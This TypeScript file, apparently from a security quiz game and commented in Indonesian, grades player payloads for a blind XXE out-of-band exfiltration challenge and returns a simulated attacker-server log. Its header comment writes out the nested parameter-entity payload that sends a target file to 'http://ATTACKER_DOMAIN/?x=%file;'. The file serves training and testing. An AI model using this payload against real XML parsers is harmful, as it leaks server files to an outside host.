// Save as: utils/Quiz/xxe-blind-evaluator.ts

// Mensimulasikan blind XXE: response aplikasi TIDAK pernah menampilkan
// isi file secara langsung (beda dengan xxe-evaluator.ts yang in-band).
// Untuk membuktikan eksploitasi berhasil, player harus merangkai payload
// dengan parameter entity berlapis supaya isi file "dikirim keluar" lewat
// request ke server yang dikontrol attacker - teknik out-of-band (OOB)
// exfiltration yang umum dipakai saat response tidak membocorkan apa pun.
//
// Pola yang dievaluasi (disederhanakan dari teknik nyata):
//   <!ENTITY % file SYSTEM "target_file_path">
//   <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://ATTACKER_DOMAIN/?x=%file;'>">
//   %eval;
//   %exfil;
//
// Trik "%eval; lalu %exfil;" ini perlu karena parameter entity tidak bisa
// langsung mereferensikan general entity dalam deklarasi yang sama - harus
// dievaluasi dulu lewat entity perantara. Tidak ada request nyata yang
// dikirim; hasil "log attacker server" di bawah murni teks simulasi.

export type XxeBlindExfilCriteria = {
  type: "xxe_blind_exfil";
  app_name: string;
  target_file_path: string;
  attacker_domain: string; // contoh: "attacker-collab.test"
  file_content: string; // isi tiruan file, dipakai untuk simulasi log OOB
};

export type XxeBlindAttemptResult = {
  success: boolean;
  reason:
    | "missing_file_entity"
    | "wrong_target_path"
    | "missing_eval_entity"
    | "missing_attacker_domain"
    | "missing_file_reference"
    | "missing_trigger"
    | "wrong_trigger_order"
    | "success";
  simulatedOobLog?: string;
};

export function evaluateXxeBlindExfil(
  criteria: XxeBlindExfilCriteria,
  payload: string
): XxeBlindAttemptResult {
  // 1. Cari deklarasi parameter entity %file yang membaca target file
  const fileMatch = payload.match(
    /<!ENTITY\s+%\s*file\s+SYSTEM\s+["']([^"']+)["']\s*>/i
  );
  if (!fileMatch) {
    return { success: false, reason: "missing_file_entity" };
  }

  const normalizedTarget = fileMatch[1].replace(/^file:\/\//i, "");
  if (normalizedTarget !== criteria.target_file_path) {
    return { success: false, reason: "wrong_target_path" };
  }

  // 2. Cari deklarasi %eval yang berisi nested entity %exfil
  const evalMatch = payload.match(
    /<!ENTITY\s+%\s*eval\s+["'][^"']*<!ENTITY\s+%\s*exfil\s+SYSTEM[^>]*>[^"']*["']\s*>/i
  );
  if (!evalMatch) {
    return { success: false, reason: "missing_eval_entity" };
  }

  const evalBlock = evalMatch[0];

  // 3. Pastikan domain attacker ada di dalam entity exfil
  if (!evalBlock.toLowerCase().includes(criteria.attacker_domain.toLowerCase())) {
    return { success: false, reason: "missing_attacker_domain" };
  }

  // 4. Pastikan %file; direferensikan di dalam URL exfil (supaya isi file ikut terkirim)
  if (!/%file;/i.test(evalBlock)) {
    return { success: false, reason: "missing_file_reference" };
  }

  // 5. Pastikan kedua entity benar-benar dipanggil (trigger)
  const hasEvalTrigger = /%eval;/i.test(payload);
  const hasExfilTrigger = /%exfil;/i.test(payload);
  if (!hasEvalTrigger || !hasExfilTrigger) {
    return { success: false, reason: "missing_trigger" };
  }

  // 6. %eval; harus dipanggil sebelum %exfil; (supaya entity exfil sudah terdefinisi)
  const evalTriggerIdx = payload.search(/%eval;/i);
  const exfilTriggerIdx = payload.search(/%exfil;/i);
  if (evalTriggerIdx > exfilTriggerIdx) {
    return { success: false, reason: "wrong_trigger_order" };
  }

  const preview =
    criteria.file_content.length > 120
      ? criteria.file_content.slice(0, 120) + "..."
      : criteria.file_content;

  const simulatedOobLog = [
    "[simulated attacker server access log]",
    `GET /?x=${encodeURIComponent(preview)} HTTP/1.1`,
    `Host: ${criteria.attacker_domain}`,
    "",
    "-> request diterima dari server korban, bukan dari browser player.",
    "-> data di query string adalah isi file yang berhasil di-exfiltrate.",
  ].join("\n");

  return { success: true, reason: "success", simulatedOobLog };
}
